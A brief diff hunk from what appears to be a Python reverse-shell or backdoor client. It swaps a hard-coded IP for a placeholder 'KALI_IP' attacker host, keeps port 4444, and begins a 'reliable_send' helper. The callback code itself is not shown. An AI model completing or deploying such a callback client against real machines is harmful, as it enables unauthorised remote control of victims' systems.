@@ -7,7 +7,7 @@ import shutil
 import time
 import io
 
-HOST = "192.168.0.168"  # Replace with your Kali IP
+HOST = "KALI_IP"  # Replace with your Kali IP
 PORT = 4444
 
 def reliable_send(s, data):
